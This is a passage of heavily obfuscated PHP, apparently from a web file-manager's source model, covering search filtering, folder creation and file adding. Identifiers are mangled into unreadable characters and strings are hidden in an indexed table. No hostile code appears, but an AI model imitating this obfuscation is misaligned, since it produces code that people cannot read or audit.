$Ç²Æèßİ[12], $Ç²Æèßİ[87]); $À à™ò– = array_unique($§àŠœî‹); $this->_listSearchMerge($ş÷óØ¼û, $ÏåÄ‘âş, $ú÷ÒŞç‰, $À à™ò–); } private function _listSearchDesc(&$óıóı¥Ú, $Îô‘çÊ», $»İÁÆ„“) { $Ò˜Öß½ =& $_SERVER[®»±”ó²]; if (empty($Îô‘çÊ»[$Ò˜Öß½[1950]]) || !in_array($Ò˜Öß½[537], $Îô‘çÊ»[$Ò˜Öß½[1950]])) { return; } if (!$Îô‘çÊ»[$Ò˜Öß½[2090]] || $óıóı¥Ú[$Ò˜Öß½[444]][$Ò˜Öß½[430]] > 1) { return; } $Ù®Šß’° = array($Ò˜Öß½[97] => $Ò˜Öß½[537], $Ò˜Öß½[452] => array($Ò˜Öß½[461], $Ò˜Öß½[2092] . $Îô‘çÊ»[$Ò˜Öß½[2090]] . $Ò˜Öß½[2092])); $êò´²¥ó = !1; if ($êò´²¥ó) { $÷÷»ëÁµ = $this->listSearchChildren($Îô‘çÊ»[$Ò˜Öß½[193]]); $÷÷»ëÁµ = array_unique($÷÷»ëÁµ); if (!$÷÷»ëÁµ) { return; } $Ù®Šß’°[$Ò˜Öß½[194]] = array($Ò˜Öß½[7], $÷÷»ëÁµ); } $®Íå’» = Model($Ò˜Öß½[648])->field($Ò˜Öß½[194])->where($Ù®Šß’°)->limit(5000)->select(); $Øµß¥®œ = array_to_keyvalue($®Íå’», $Ò˜Öß½[12], $Ò˜Öß½[194]); $this->_listSearchMerge($óıóı¥Ú, $Îô‘çÊ», $»İÁÆ„“, $Øµß¥®œ); } private function _listSearchGroupTag(&$îåÇîòÑ, $ûËìŸş, $¦öàÈÊ) { $‡Š–¼ç =& $_SERVER[®»±”ó²]; if (empty($ûËìŸş[$‡Š–¼ç[1950]]) || !in_array($‡Š–¼ç[2260], $ûËìŸş[$‡Š–¼ç[1950]])) { return; } if (!$ûËìŸş[$‡Š–¼ç[2090]] || $îåÇîòÑ[$‡Š–¼ç[444]][$‡Š–¼ç[430]] > 1 || !$ûËìŸş[$‡Š–¼ç[193]]) { return; } $Øˆ›Œê€ = $this->sourceInfo($ûËìŸş[$‡Š–¼ç[193]]); if (!$Øˆ›Œê€ || $Øˆ›Œê€[$‡Š–¼ç[191]] != SourceModel::TYPE_GROUP) { return; } $ùÜÍ™ø = $Øˆ›Œê€[$‡Š–¼ç[582]]; $Ú¦ï­˜ = Model($‡Š–¼ç[2262])->get($ùÜÍ™ø); $¢ã—˜Á¬ = array(); $øœî‚ê = $ûËìŸş[$‡Š–¼ç[2090]]; foreach ($Ú¦ï­˜[$‡Š–¼ç[447]] as $ÁİÆ§‘ø) { $«İ‡Š»· = $ÁİÆ§‘ø[$‡Š–¼ç[32]]; $‰í½æñ = str_replace($‡Š–¼ç[53], $‡Š–¼ç[12], Pinyin::get($«İ‡Š»·)); if (stripos($«İ‡Š»·, $øœî‚ê) !== !1 || stripos($‰í½æñ, $øœî‚ê) !== !1) { $¢ã—˜Á¬[] = $ÁİÆ§‘ø[$‡Š–¼ç[477]]; } } if (!$¢ã—˜Á¬) { return; } $¼ÔüÆ¶² = array($‡Š–¼ç[511] => array($‡Š–¼ç[7], $¢ã—˜Á¬), $‡Š–¼ç[1791] => 0, $‡Š–¼ç[33] => $‡Š–¼ç[1398] . $ùÜÍ™ø); $â±Ÿ§Îö = Model($‡Š–¼ç[513])->field($‡Š–¼ç[87])->where($¼ÔüÆ¶²)->select(); $â±Ÿ§Îö = array_to_keyvalue($â±Ÿ§Îö, $‡Š–¼ç[12], $‡Š–¼ç[87]); $âº¶´½» = array_unique($â±Ÿ§Îö); $this->_listSearchMerge($îåÇîòÑ, $ûËìŸş, $¦öàÈÊ, $âº¶´½»); } private function _listSearchMerge(&$•ˆ·ìš, $ÒõÃ¯Ó, $¹êÖï, $…«›å¡) { $Âİñ³ø” =& $_SERVER[®»±”ó²]; if (!$…«›å¡) { return; } $–ğş‹ç = array_to_keyvalue($•ˆ·ìš[$Âİñ³ø”[447]], $Âİñ³ø”[12], $Âİñ³ø”[194]); $Ğêæüò = array_diff($…«›å¡, $–ğş‹ç); if (!$Ğêæüò) { return; } $ìˆÍµñ› = array($Âİñ³ø”[194] => array($Âİñ³ø”[7], $Ğêæüò)); $î…ßî­“ = $this->field($¹êÖï)->where($ìˆÍµñ›)->select(); if (!$î…ßî­“) { return; } $´”®¶ìÜ = array(); foreach ($î…ßî­“ as $‹Ğ•›ô) { if ($this->_listSearchFilter($‹Ğ•›ô, $ÒõÃ¯Ó)) { $´”®¶ìÜ[] = $‹Ğ•›ô; } } $•ˆ·ìš[$Âİñ³ø”[447]] = array_merge($´”®¶ìÜ, $•ˆ·ìš[$Âİñ³ø”[447]]); $•ˆ·ìš[$Âİñ³ø”[444]][$Âİñ³ø”[445]] += count($´”®¶ìÜ); } private function _listSearchFilter($¸Ì˜Õ¡æ, $šğœË›Ì) { $°Ä‰¥òÇ =& $_SERVER[®»±”ó²]; $Î½¯ˆåë = $¸Ì˜Õ¡æ[$°Ä‰¥òÇ[496]] == $°Ä‰¥òÇ[91]; if (!strstr($¸Ì˜Õ¡æ[$°Ä‰¥òÇ[597]], $°Ä‰¥òÇ[50] . $šğœË›Ì[$°Ä‰¥òÇ[193]] . $°Ä‰¥òÇ[50])) { return !1; } if (isset($šğœË›Ì[$°Ä‰¥òÇ[497]]) && $šğœË›Ì[$°Ä‰¥òÇ[497]] != $°Ä‰¥òÇ[857]) { if ($šğœË›Ì[$°Ä‰¥òÇ[497]] == $°Ä‰¥òÇ[78] && !$Î½¯ˆåë) { return !1; } if ($šğœË›Ì[$°Ä‰¥òÇ[497]] != $°Ä‰¥òÇ[78] && $Î½¯ˆåë) { return !1; } if (!strstr($¸Ì˜Õ¡æ[$°Ä‰¥òÇ[169]], $°Ä‰¥òÇ[50] . $šğœË›Ì[$°Ä‰¥òÇ[497]] . $°Ä‰¥òÇ[50])) { return !1; } } if (isset($šğœË›Ì[$°Ä‰¥òÇ[2263]]) && $šğœË›Ì[$°Ä‰¥òÇ[2263]] < $¸Ì˜Õ¡æ[$°Ä‰¥òÇ[79]]) { return !1; } if (isset($šğœË›Ì[$°Ä‰¥òÇ[2264]]) && $šğœË›Ì[$°Ä‰¥òÇ[2264]] > $¸Ì˜Õ¡æ[$°Ä‰¥òÇ[79]]) { return !1; } if (isset($šğœË›Ì[$°Ä‰¥òÇ[678]]) && $šğœË›Ì[$°Ä‰¥òÇ[678]] != $¸Ì˜Õ¡æ[$°Ä‰¥òÇ[540]]) { return !1; } return !0; } public function listSearchChildren($Ò‹¨¶áÅ, $¬ì­°÷Ê = 5000) { $äçİ‘„ =& $_SERVER[®»±”ó²]; $Ùğ€úØù = array(); $‹ğ™ÍªÇ = $this->sourceInfo($Ò‹¨¶áÅ); $ÛëœÌâÛ = array($äçİ‘„[597] => array($äçİ‘„[461], $‹ğ™ÍªÇ[$äçİ‘„[597]] . $‹ğ™ÍªÇ[$äçİ‘„[194]] . $äçİ‘„[629])); $åäì«óÈ = $this->field($äçİ‘„[79])->where($ÛëœÌâÛ)->limit($¬ì­°÷Ê + 1)->select(); $æø¿ã¾› = is_array($åäì«óÈ) ? count($åäì«óÈ) : 0; if ($æø¿ã¾› > $¬ì­°÷Ê) { return $this->_listSearchChildrenNear($Ò‹¨¶áÅ, $¬ì­°÷Ê); } $Ææ’ôì… = $this->field($äçİ‘„[194])->where($ÛëœÌâÛ)->select(); $Ùğ€úØù = array_to_keyvalue($Ææ’ôì…, $äçİ‘„[12], $äçİ‘„[194]); return $Ùğ€úØù; } private function _listSearchChildrenNear($¬Ÿ·íı­, $ÌˆÒ£„) { $æ¦ßÎö¥ =& $_SERVER[®»±”ó²]; $Œœ…Ç›ü = array(); $±¦˜±â¬ = array($æ¦ßÎö¥[193] => $¬Ÿ·íı­); $…û›ıÃİ = $this->field($æ¦ßÎö¥[2265])->where($±¦˜±â¬)->select(); $¨‘¬ß˜ß = array_to_keyvalue(array_filter_by_field($…û›ıÃİ, $æ¦ßÎö¥[496], $æ¦ßÎö¥[91]), $æ¦ßÎö¥[12], $æ¦ßÎö¥[194]); $Œœ…Ç›ü = array_merge($Œœ…Ç›ü, array_to_keyvalue($…û›ıÃİ, $æ¦ßÎö¥[12], $æ¦ßÎö¥[194])); if (!$¨‘¬ß˜ß) { return $Œœ…Ç›ü; } $±¦˜±â¬ = array($æ¦ßÎö¥[193] => array($æ¦ßÎö¥[7], $¨‘¬ß˜ß)); $…û›ıÃİ = $this->field($æ¦ßÎö¥[2265])->where($±¦˜±â¬)->limit($ÌˆÒ£„)->select(); $Œœ…Ç›ü = array_merge($Œœ…Ç›ü, array_to_keyvalue($…û›ıÃİ, $æ¦ßÎö¥[12], $æ¦ßÎö¥[194])); $Œœ…Ç›ü = array_slice($Œœ…Ç›ü, 0, intval($ÌˆÒ£„)); return $Œœ…Ç›ü; } private function _listSearchBindPinyin($ªØŠÁáÈ, &$ò¡êË¼Õ, &$–õÁ¸Ê˜) { $É½Ê°»§ =& $_SERVER[®»±”ó²]; if (!isset($ªØŠÁáÈ[$É½Ê°»§[2090]]) || !$ªØŠÁáÈ[$É½Ê°»§[2090]]) { return; } if (!Input::check($ªØŠÁáÈ[$É½Ê°»§[2090]], $É½Ê°»§[395]) || strlen($ªØŠÁáÈ[$É½Ê°»§[2090]]) < 2) { return; } $ºÑÕ = "\114\105\106\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\x73\157\x75\162\x63\x65\x5f\155\x65\x74\x61\40\155\x65\x74\x61\40\157\156\x20\163\x6f\x75\x72\143\x65\x2e\x73\157\165\162\x63\x65\x49\x44\x20\75\40\x6d\145\x74\141\56\x73\157\x75\x72\143\x65\x49\x44"; $”Ÿ„¡… = array(); $–õÁ¸Ê˜ = str_replace(array($É½Ê°»§[288], $É½Ê°»§[53], $É½Ê°»§[2266]), $É½Ê°»§[12], $–õÁ¸Ê˜); $–õÁ¸Ê˜ = $É½Ê°»§[522] . str_replace($É½Ê°»§[50], $É½Ê°»§[523], $–õÁ¸Ê˜); $Ó‡ã´í = $ò¡êË¼Õ[$É½Ê°»§[32]]; unset($ò¡êË¼Õ[$É½Ê°»§[32]]); foreach ($ò¡êË¼Õ as $®ÈæÖÍş => $ˆ§ËÑÖÌ) { $”Ÿ„¡…[$É½Ê°»§[522] . $®ÈæÖÍş] = $ˆ§ËÑÖÌ; } foreach ($Ó‡ã´í as $«ƒ¯á÷) { $”Ÿ„¡…[] = array($É½Ê°»§[527] => $«ƒ¯á÷, $É½Ê°»§[1087] => $É½Ê°»§[2094], array($É½Ê°»§[2267] => $«ƒ¯á÷, $É½Ê°»§[2268] => array($É½Ê°»§[7], array($É½Ê°»§[549], $É½Ê°»§[548])))); } $this->join($ºÑÕ); $ò¡êË¼Õ = $”Ÿ„¡…; } private function _parseSearchWhere($¶ ú¼ã) { $’½“Ñ•â =& $_SERVER[®»±”ó²]; $İÓ°¡ = array(); if (isset($¶ ú¼ã[$’½“Ñ•â[841]]) && $¶ ú¼ã[$’½“Ñ•â[841]]) { $İÓ°¡[$’½“Ñ•â[88]] = array($’½“Ñ•â[2269], $¶ ú¼ã[$’½“Ñ•â[841]]); } if (isset($¶ ú¼ã[$’½“Ñ•â[842]]) && $¶ ú¼ã[$’½“Ñ•â[842]]) { $³¶÷º¥º = array($’½“Ñ•â[2270], $¶ ú¼ã[$’½“Ñ•â[842]]); if ($İÓ°¡[$’½“Ñ•â[88]]) { $İÓ°¡[$’½“Ñ•â[88]] = array($İÓ°¡[$’½“Ñ•â[88]], $³¶÷º¥º, $’½“Ñ•â[2271]); } else { $İÓ°¡[$’½“Ñ•â[88]] = $³¶÷º¥º; } } if (isset($¶ ú¼ã[$’½“Ñ•â[2263]]) && $¶ ú¼ã[$’½“Ñ•â[2263]] > 0) { $İÓ°¡[$’½“Ñ•â[79]] = array($’½“Ñ•â[2269], $¶ ú¼ã[$’½“Ñ•â[2263]]); } if (isset($¶ ú¼ã[$’½“Ñ•â[2264]]) && $¶ ú¼ã[$’½“Ñ•â[2264]]) { $³¶÷º¥º = array($’½“Ñ•â[2270], $¶ ú¼ã[$’½“Ñ•â[2264]]); if ($İÓ°¡[$’½“Ñ•â[79]]) { $İÓ°¡[$’½“Ñ•â[79]] = array($İÓ°¡[$’½“Ñ•â[79]], $³¶÷º¥º, $’½“Ñ•â[2271]); } else { $İÓ°¡[$’½“Ñ•â[79]] = $³¶÷º¥º; } } if (isset($¶ ú¼ã[$’½“Ñ•â[678]]) && $¶ ú¼ã[$’½“Ñ•â[678]]) { $İÓ°¡[] = array($’½“Ñ•â[540] => $¶ ú¼ã[$’½“Ñ•â[678]], $’½“Ñ•â[538] => $¶ ú¼ã[$’½“Ñ•â[678]], $’½“Ñ•â[1087] => $’½“Ñ•â[2094]); } if (isset($¶ ú¼ã[$’½“Ñ•â[497]]) && $¶ ú¼ã[$’½“Ñ•â[497]]) { $¼¾—öÈô = $¶ ú¼ã[$’½“Ñ•â[497]]; if ($¼¾—öÈô == $’½“Ñ•â[78]) { $İÓ°¡[$’½“Ñ•â[496]] = 1; } else { if ($¼¾—öÈô == $’½“Ñ•â[2272]) { $İÓ°¡[$’½“Ñ•â[496]] = 0; } else { if ($¼¾—öÈô) { $¼¾—öÈô = is_array($¼¾—öÈô) ? $¼¾—öÈô : explode($’½“Ñ•â[50], $¼¾—öÈô); $İÓ°¡[$’½“Ñ•â[497]] = array($’½“Ñ•â[503], $¼¾—öÈô); $İÓ°¡[$’½“Ñ•â[496]] = 0; } } } } $this->_parseSearchParent($¶ ú¼ã, $İÓ°¡); if (isset($¶ ú¼ã[$’½“Ñ•â[2090]]) && trim($¶ ú¼ã[$’½“Ñ•â[2090]])) { $½äåÖ° = trim($¶ ú¼ã[$’½“Ñ•â[2090]]); $ê’›Î†… = explode($’½“Ñ•â[53], $½äåÖ°); if (strlen($½äåÖ°) > 2 && (substr($½äåÖ°, 0, 1) == $’½“Ñ•â[121] && substr($½äåÖ°, -1) == $’½“Ñ•â[121]) || substr($½äåÖ°, 0, 1) == $’½“Ñ•â[58] && substr($½äåÖ°, -1) == $’½“Ñ•â[58]) { $½äåÖ° = substr($½äåÖ°, 1, -1); $ê’›Î†… = array($½äåÖ°); } $İÓ°¡[$’½“Ñ•â[32]] = array(array($’½“Ñ•â[628], $’½“Ñ•â[2092] . $½äåÖ° . $’½“Ñ•â[2092])); if (count($ê’›Î†…) > 1) { $İÓ°¡[$’½“Ñ•â[32]] = array(); foreach ($ê’›Î†… as $Æ¨ÃÉıÅ) { if (!trim($Æ¨ÃÉıÅ)) { continue; } $İÓ°¡[$’½“Ñ•â[32]][] = array($’½“Ñ•â[628], $’½“Ñ•â[2092] . trim($Æ¨ÃÉıÅ) . $’½“Ñ•â[2092]); } } } return $İÓ°¡; } private function _parseSearchParent($åäõ§ş, &$šÒù½¤Ì) { $Ì´Ë²š =& $_SERVER[®»±”ó²]; if (!isset($åäõ§ş[$Ì´Ë²š[193]]) || !$åäõ§ş[$Ì´Ë²š[193]]) { return; } $úÀ­Åà = $this->pathInfo($åäõ§ş[$Ì´Ë²š[193]]); $€Ö²‡é¯ = $úÀ­Åà[$Ì´Ë²š[193]] . $Ì´Ë²š[12] === $Ì´Ë²š[231]; $°ãË¯·‹ = $úÀ­Åà[$Ì´Ë²š[191]] == $Ì´Ë²š[591]; if ($úÀ­Åà[$Ì´Ë²š[607]] == $Ì´Ë²š[608]) { $­Ù„¼ã = $this->sourceInfo($åäõ§ş[$Ì´Ë²š[193]]); $úÀ­Åà[$Ì´Ë²š[597]] = $­Ù„¼ã[$Ì´Ë²š[597]]; } $šÒù½¤Ì[$Ì´Ë²š[668]] = array($Ì´Ë²š[628], $úÀ­Åà[$Ì´Ë²š[597]] . $åäõ§ş[$Ì´Ë²š[193]] . $Ì´Ë²š[629]); $Ù¦®¯‹Í = isset($åäõ§ş[$Ì´Ë²š[1950]]) && in_array($Ì´Ë²š[591], $åäõ§ş[$Ì´Ë²š[1950]]); if (!$Ù¦®¯‹Í || !$°ãË¯·‹ || !$€Ö²‡é¯ || !$úÀ­Åà[$Ì´Ë²š[498]]) { return; } if (!AuthModel::authCheckRoot($úÀ­Åà[$Ì´Ë²š[498]][$Ì´Ë²š[499]])) { return; } $Ã‘²Úª = $úÀ­Åà[$Ì´Ë²š[582]] . $Ì´Ë²š[12]; if ($Ã‘²Úª == $Ì´Ë²š[91]) { unset($šÒù½¤Ì[$Ì´Ë²š[668]]); $šÒù½¤Ì[$Ì´Ë²š[191]] = self::TYPE_GROUP; return; } $—ÏÙú¹ = Model($Ì´Ë²š[598])->groupChildrenAll($Ã‘²Úª); $‡ÕˆÖû = count($—ÏÙú¹); if ($‡ÕˆÖû <= 1) { return; } $ìª§€¨¢ = array($Ì´Ë²š[193] => 0, $Ì´Ë²š[191] => self::TYPE_GROUP, $Ì´Ë²š[582] => array($Ì´Ë²š[7], $—ÏÙú¹)); $ø¥Üãã = $this->field($Ì´Ë²š[2273])->where($ìª§€¨¢)->limit($‡ÕˆÖû)->select(); $šÒù½¤Ì[$Ì´Ë²š[668]] = array(); foreach ($ø¥Üãã as $ı„àâ½) { $šÒù½¤Ì[$Ì´Ë²š[668]][] = array($Ì´Ë²š[628], $Ì´Ë²š[606] . $ı„àâ½[$Ì´Ë²š[194]] . $Ì´Ë²š[629]); } $šÒù½¤Ì[$Ì´Ë²š[668]][] = $Ì´Ë²š[2094]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($‚ü†™Üã) { $–ñ¦´ıê =& $_SERVER[®»±”ó²]; $Ÿššì¨€ = Model($–ñ¦´ıê[590])->where(array($–ñ¦´ıê[1782] => $‚ü†™Üã))->find(); $°¾…ÚÍ¦ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‚ü†™Üã, $Ÿššì¨€[$–ñ¦´ıê[32]]); $this->userDesktopAdd($°¾…ÚÍ¦); return $°¾…ÚÍ¦; } public function userDesktopAdd($¤´¶¡ˆŸ) { $±Ó±±“¶ =& $_SERVER[®»±”ó²]; $‚ĞÃ¥õ² = LNG($±Ó±±“¶[2274]); $Ë™ÑÀ¸Ñ = $this->mkdir($¤´¶¡ˆŸ, $‚ĞÃ¥õ²); $this->metaSet($Ë™ÑÀ¸Ñ, $±Ó±±“¶[2275], $±Ó±±“¶[91]); $this->metaSet($¤´¶¡ˆŸ, $±Ó±±“¶[2276], $Ë™ÑÀ¸Ñ); } public function userPathSafeAdd($âÛ½¸ãï) { $Ô±ü¸ôÏ =& $_SERVER[®»±”ó²]; $‰Í”…æ = Model($Ô±ü¸ôÏ[590])->getInfoFull($âÛ½¸ãï); if (!$‰Í”…æ) { return !1; } if (_get($‰Í”…æ, $Ô±ü¸ôÏ[611])) { return $‰Í”…æ[$Ô±ü¸ôÏ[552]][$Ô±ü¸ôÏ[2277]]; } $ÀÇ…¹Û© = $this->_mkdirRoot(SourceModel::TYPE_USER, $âÛ½¸ãï, $Ô±ü¸ôÏ[2278], $Ô±ü¸ôÏ[2279]); Model($Ô±ü¸ôÏ[590])->metaSet($âÛ½¸ãï, $Ô±ü¸ôÏ[2277], $ÀÇ…¹Û©); $this->metaSet($ÀÇ…¹Û©, $Ô±ü¸ôÏ[2280], $âÛ½¸ãï); return $ÀÇ…¹Û©; } public function userPathAppAdd($ª»Ó–ëö, $è©”¿®é = '', $ªã¢İêŞ = '') { $Ï‰ã”öó =& $_SERVER[®»±”ó²]; $Ø ñïôÓ = Model($Ï‰ã”öó[590])->getInfoFull($ª»Ó–ëö); if (!$Ø ñïôÓ) { return !1; } $º¿¨‹’Ö = $Ø ñïôÓ[$Ï‰ã”öó[552]] ? $Ø ñïôÓ[$Ï‰ã”öó[552]] : array(); $İ®º‹ë‰ = $º¿¨‹’Ö[$Ï‰ã”öó[2281]]; if (!$İ®º‹ë‰) { $İ®º‹ë‰ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ª»Ó–ëö, $Ï‰ã”öó[2282], $Ï‰ã”öó[2283]); Model($Ï‰ã”öó[590])->metaSet($ª»Ó–ëö, $Ï‰ã”öó[2281], $İ®º‹ë‰ . $Ï‰ã”öó[12]); $this->metaSet($İ®º‹ë‰, $Ï‰ã”öó[2281], $ª»Ó–ëö); } if (!$è©”¿®é) { return $İ®º‹ë‰; } $ÍÊö˜Ò” = $º¿¨‹’Ö[$Ï‰ã”öó[2284] . $è©”¿®é]; if (!$ÍÊö˜Ò”) { $ÍÊö˜Ò” = $this->mkdir($İ®º‹ë‰, $è©”¿®é); Model($Ï‰ã”öó[590])->metaSet($ª»Ó–ëö, $Ï‰ã”öó[2284] . $è©”¿®é, $ÍÊö˜Ò”); $this->metaSet($ÍÊö˜Ò”, $Ï‰ã”öó[2284] . $è©”¿®é, $ª»Ó–ëö); } if (!$ªã¢İêŞ) { return $ÍÊö˜Ò”; } $ƒÕã®æ“ = $this->mkdir($ÍÊö˜Ò”, $ªã¢İêŞ); return $ƒÕã®æ“; } public function groupRootAdd($ˆŒ¨‚Ü³) { $«®ø¼Â =& $_SERVER[®»±”ó²]; $ÏÆæÙğ¡ = Model($«®ø¼Â[598])->where(array($«®ø¼Â[2081] => $ˆŒ¨‚Ü³))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ˆŒ¨‚Ü³, $ÏÆæÙğ¡[$«®ø¼Â[32]]); } public function systemRootPathAdd($©¾£Âú¤) { if ($©¾£Âú¤ != $_SERVER[®»±”ó²][621]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $©¾£Âú¤); } public function userRootRemove($ÔğúÎÅŒ) { $§··†íõ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÔğúÎÅŒ, !0); foreach ($§··†íõ as $¾Î¹±™À) { if (!$¾Î¹±™À) { continue; } $this->remove($¾Î¹±™À[$_SERVER[®»±”ó²][194]], !1); } } public function groupRootRemove($‡½ù²Å¶) { $¶Çààİ— = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $‡½ù²Å¶); if (!$¶Çààİ—) { return; } $this->remove($¶Çààİ—[$_SERVER[®»±”ó²][194]], !1); } private function _mkdirRoot($É¢ó‚¡„, $ˆ¦»Ãîş, $¥ĞöŸÆ, $æ²À¿ ù = '') { $‡áÈ°Û« =& $_SERVER[®»±”ó²]; $¿·Ê’ÓÚ = defined($‡áÈ°Û«[2219]) ? USER_ID : 0; $›ÉÚä›™ = array($‡áÈ°Û«[488] => 0, $‡áÈ°Û«[664] => $É¢ó‚¡„, $‡áÈ°Û«[665] => $ˆ¦»Ãîş, $‡áÈ°Û«[662] => 1, $‡áÈ°Û«[666] => $¿·Ê’ÓÚ, $‡áÈ°Û«[667] => $¿·Ê’ÓÚ, $‡áÈ°Û«[663] => $æ²À¿ ù, $‡áÈ°Û«[668] => $‡áÈ°Û«[606], $‡áÈ°Û«[515] => 0, $‡áÈ°Û«[633] => 0, $‡áÈ°Û«[555] => 0, $‡áÈ°Û«[669] => $‡áÈ°Û«[12]); if ($ÃıíÀş‹ = $this->where($›ÉÚä›™)->find()) { return $ÃıíÀş‹[$‡áÈ°Û«[194]]; } $¦ŠÜã = "\x4d\157\144\x65\154\x53\x6f\x75\162\x63\x65\56\155\153\144\x69\x72\122\157\x6f\x74\56{$É¢ó‚¡„}\x2e{$ˆ¦»Ãîş}\x2e" . $¥ĞöŸÆ; CacheLock::lock($¦ŠÜã); $›ÉÚä›™[$‡áÈ°Û«[32]] = $¥ĞöŸÆ; $Ó¬à×ğ = $this->add($›ÉÚä›™); $ÓğóõÈã = array($‡áÈ°Û«[670] => short_id($Ó¬à×ğ)); $this->where(array($‡áÈ°Û«[502] => $Ó¬à×ğ))->save($ÓğóõÈã); CacheLock::unlock($¦ŠÜã); return $Ó¬à×ğ; } private function targetSourceRoot($ƒ¸¾‹·ô, $¡ÏîÛÖ­, $ï†§í‰˜ = false) { $åƒ‘Éµã =& $_SERVER[®»±”ó²]; $ÑéŸ×îñ = array($åƒ‘Éµã[488] => 0, $åƒ‘Éµã[664] => $ƒ¸¾‹·ô, $åƒ‘Éµã[665] => $¡ÏîÛÖ­); if ($ï†§í‰˜) { $ùùÌß‡Ò = $this->where($ÑéŸ×îñ)->select(); return $ùùÌß‡Ò ? $ùùÌß‡Ò : array(); } $ÈÊ“ûº‚ = $this->where($ÑéŸ×îñ)->find(); return $ÈÊ“ûº‚ ? $ÈÊ“ûº‚ : array(); } public function sourceRootGroup($ïëäÁ¨Ü) { $¤˜ØÑ‰ =& $_SERVER[®»±”ó²]; if (is_string($ïëäÁ¨Ü)) { $ïëäÁ¨Ü = array($ïëäÁ¨Ü); } $ú•„ìı­ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ïëäÁ¨Ü, $¤˜ØÑ‰[223]); $ú¬’£¥¦ = array($¤˜ØÑ‰[447] => $ú•„ìı­, $¤˜ØÑ‰[444] => array($¤˜ØÑ‰[839] => count($ïëäÁ¨Ü))); $this->_listDataApply($ú¬’£¥¦[$¤˜ØÑ‰[447]]); $this->_listMake($ú¬’£¥¦); return array_to_keyvalue($ú¬’£¥¦[$¤˜ØÑ‰[85]], $¤˜ØÑ‰[582]); } public function mkfile($ÈŞĞƒõó, $ÖÙ½Â†, $êúõëßı = '', $¡Ò¸ï¬× = REPEAT_RENAME) { $ª×°¬ÎÑ =& $_SERVER[®»±”ó²]; $÷ ¸ßàã = KodIO::ioFileDriverGet($ª×°¬ÎÑ[494] . $ÈŞĞƒõó . $ª×°¬ÎÑ[404]); $ ×ÁÅ‘¨ = Model($ª×°¬ÎÑ[690])->addFileByContent($êúõëßı, $÷ ¸ßàã, $ÖÙ½Â†); return $this->_createFileCall($ÈŞĞƒõó, $ÖÙ½Â†, $ ×ÁÅ‘¨, $¡Ò¸ï¬×, $ª×°¬ÎÑ[1450]); } public function addFile($Ç„â¶Ù½, $ÄÒøõóî, $›Ú¬–Á, $—ñ¨¿®Š = false, $ŞªøÑ÷‘ = REPEAT_RENAME) { $öôŒÁòö =& $_SERVER[®»±”ó²]; $Åè¹ÈÚÌ = KodIO::ioFileDriverGet($öôŒÁòö[494] . $Ç„â¶Ù½ . $öôŒÁòö[404]); $“šïÛŒÛ = Model($öôŒÁòö[690])->addFile($ÄÒøõóî, $Åè¹ÈÚÌ, $›Ú¬–Á, $—ñ¨¿®Š); return $this->_createFileCall($Ç„â¶Ù½, $›Ú¬–Á, $“šïÛŒÛ, $ŞªøÑ÷‘); } public function addFileByFileID($å÷ª¼¨, $ªó¾ëâ, $½øÍ•æ¶, $ß¨ÈÈ…‡ = REPEAT_RENAME) { $‰ªÄÁÇÚ =& $_SERVER[®»±”ó²]; $¡õ†£ú = Model($‰ªÄÁÇÚ[690])->find($ªó¾ëâ); Model($‰ªÄÁÇÚ[690])->linkAdd($ªó¾ëâ); return $this->_createFileCall($å÷ª¼¨, $½øÍ•æ¶, $¡õ†£ú, $ß¨ÈÈ…‡); } public function addFileByRemote($è÷ıéÉ, $úéÀÍøÙ, $òĞÌÍù, $Êş¼—Î = array(), $õó ”ôş = REPEAT_RENAME) { $“¤§ Œ = Model($_SERVER[®»±”ó²][690])->addFileByRemote($úéÀÍøÙ, $òĞÌÍù, $Êş¼—Î); return $this->_createFileCall($è÷ıéÉ, $òĞÌÍù, $“¤§ Œ, $õó ”ôş); } private function _createFileCall($È”åÜ¥ã, $Ô¹•Œ·û, $Á¸ŠÑìç, $Í™û†¾§, $ÑîöÌè = "\165\x70\x6c\x6f\141\144") { $ú×œÇÓË =& $_SERVER[®»±”ó²]; if (!$Á¸ŠÑìç) { return !1; } $×Œûª®Õ = !1; $this->setMasterDB(); $this->lockWriteStart($È”åÜ¥ã, $Ô¹•Œ·û); $ü„é‚® = $this->fileNameExist($È”åÜ¥ã, $Ô¹•Œ·û); $À£Ò¾ä¾ = $this->_createFile($È”åÜ¥ã, $Ô¹•Œ·û, $Á¸ŠÑìç, $Í™û†¾§, $×Œûª®Õ); if (!$×Œûª®Õ) { Model($ú×œÇÓË[557])->remove($Á¸ŠÑìç[$ú×œÇÓË[554]]); } if ($×Œûª®Õ && $À£Ò¾ä¾ && $À£Ò¾ä¾ != $ü„é‚®) { Model($ú×œÇÓË[2246])->eventCreate($À£Ò¾ä¾, $ÑîöÌè); } $this->lockWriteEnd($È”åÜ¥ã, $Ô¹•Œ·û); return $À£Ò¾ä¾; } public function mkdir($­Š‚…ñà, $‹Ñ…‹Åœ, $¿¨ŸïËÔ = REPEAT_SKIP) { $Íç¡—Ï =& $_SERVER[®»±”ó²]; $this->setMasterDB(); $°ˆÅûû” = $this->sourceInfo($­Š‚…ñà); if (!$°ˆÅûû”) { return !1; } $this->lockWriteStart($­Š‚…ñà, $‹Ñ…‹Åœ); if ($¿¨ŸïËÔ !== !1) { $®»è¥úÅ = $this->fileNameExist($­Š‚…ñà, $‹Ñ…‹Åœ); if ($®»è¥úÅ && $¿¨ŸïËÔ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($­Š‚…ñà, $‹Ñ…‹Åœ); return $®»è¥úÅ; } $‹Ñ…‹Åœ = $this->fileNameAuto($­Š‚…ñà, $‹Ñ…‹Åœ, $¿¨ŸïËÔ); } $ÉåÑÔóë = array($Íç¡—Ï[662] => 1, $Íç¡—Ï[505] => $‹Ñ…‹Åœ, $Íç¡—Ï[663] => $Íç¡—Ï[12], $Íç¡—Ï[555] => 0, $Íç¡—Ï[633] => 0); $äòÑĞ÷å = $this->_addSource($ÉåÑÔóë, $°ˆÅûû”); Model($Íç¡—Ï[2246])->eventCreate($äòÑĞ÷å, $Íç¡—Ï[1451]); $this->lockWriteEnd($­Š‚…ñà, 